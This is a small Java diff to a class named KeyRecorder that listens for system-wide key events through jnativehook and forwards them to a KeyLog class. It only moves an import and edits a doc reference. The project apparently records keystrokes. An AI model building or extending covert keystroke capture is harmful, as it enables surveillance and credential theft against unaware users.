@@ -1,12 +1,12 @@
 package com.rmac.core;
 
 import com.rmac.RMAC;
+import com.rmac.process.KeyLog;
 import com.rmac.utils.Constants;
 import com.rmac.utils.PipeStream;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
-import java.io.InputStreamReader;
 import java.util.HashMap;
 import java.util.logging.Level;
 import java.util.logging.LogManager;
@@ -19,7 +19,7 @@ import org.jnativehook.keyboard.NativeKeyListener;
 /**
  * Listens for key events and forwards them to <code>KeyLog</code>
  *
- * @see com.rmac.core.KeyLog
+ * @see KeyLog
  */
 @Slf4j
 public class KeyRecorder implements NativeKeyListener {
